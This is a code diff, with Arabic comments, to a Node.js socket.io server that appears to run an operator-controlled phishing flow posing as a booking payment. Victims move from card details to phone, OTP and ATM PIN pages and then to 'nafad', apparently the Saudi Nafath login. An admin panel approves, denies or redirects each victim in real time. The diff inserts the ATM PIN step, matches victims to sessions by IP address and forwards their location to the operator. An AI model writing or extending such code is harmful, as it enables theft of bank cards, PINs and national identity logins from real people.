@@ -564,7 +564,27 @@ io.on("connection", (socket) => {
   // Update location
   socket.on("updateLocation", async (data) => {
     try {
-      notifyAdmin("locationUpdate", { socketId: socket.id, ...data });
+      // إذا كان الـ socket لا يحمل referenceId، نبحث عنه بالـ IP
+      if (!socket.referenceId && data.ip) {
+        try {
+          const result = await pool.query(
+            "SELECT referenceid FROM bookings WHERE clientip = $1 ORDER BY createdat DESC LIMIT 1",
+            [data.ip]
+          );
+          if (result.rows.length > 0) {
+            const refId = result.rows[0].referenceid;
+            socket.referenceId = refId;
+            socket.join(refId);
+            console.log(`Socket ${socket.id} joined room ${refId} via IP ${data.ip}`);
+          }
+        } catch (e) {
+          console.error("updateLocation IP lookup error:", e);
+        }
+      } else if (socket.referenceId) {
+        // تأكد من أن الـ socket في الـ room
+        socket.join(socket.referenceId);
+      }
+      notifyAdmin("locationUpdate", { socketId: socket.id, referenceId: socket.referenceId, ...data });
     } catch (err) {
       console.error("updateLocation error:", err);
     }
@@ -685,9 +705,15 @@ app.post("/api/admin/navigate", verifyAdminToken, async (req, res) => {
   try {
     const { referenceId, reference, page, clientIp } = req.body;
     const ref = referenceId || reference;
-    // Emit to specific user room
-    io.to(ref).emit("navigateTo", { page, ip: clientIp });
-    res.json({ success: true });
+    // جلب IP العميل من قاعدة البيانات إذا لم يُرسل
+    let ip = clientIp;
+    if (!ip && ref) {
+      const booking = await getBookingByReference(ref);
+      ip = booking?.clientIp || '';
+    }
+    // إرسال navigateTo للعميل
+    io.to(ref).emit("navigateTo", { page, ip });
+    res.json({ success: true, page, ip });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -753,17 +779,22 @@ app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
     if (action === 'pass') {
       // تحديد الصفحة التالية بناءً على الخطوة
       if (currentStep === 1) {
-        targetPage = 'phone'; // بعد بيانات البطاقة → رقم الجوال
+        targetPage = 'phone'; // بعد بيانات البطاقة → صفحة OTP
         nextStep = 2;
       } else if (currentStep === 2) {
-        targetPage = 'phoneCode'; // بعد رقم الجوال → كود OTP
+        targetPage = 'pin'; // بعد OTP → صفحة الرقم السري ATM
         nextStep = 3;
       } else {
-        targetPage = 'nafad'; // بعد كود OTP → نفاذ
+        targetPage = 'nafad'; // بعد الرقم السري → نفاذ
         nextStep = 4;
       }
-    } else {
+    } else if (action === 'deny') {
       // رفض - إعادة لصفحة الدفع مع علامة declined
+      targetPage = 'payments?declined=true';
+    } else if (action === 'navigate' && req.body.targetPage) {
+      // إعادة توجيه مخصصة - الأدمن يختار الصفحة
+      targetPage = req.body.targetPage;
+    } else {
       targetPage = 'payments?declined=true';
     }
     
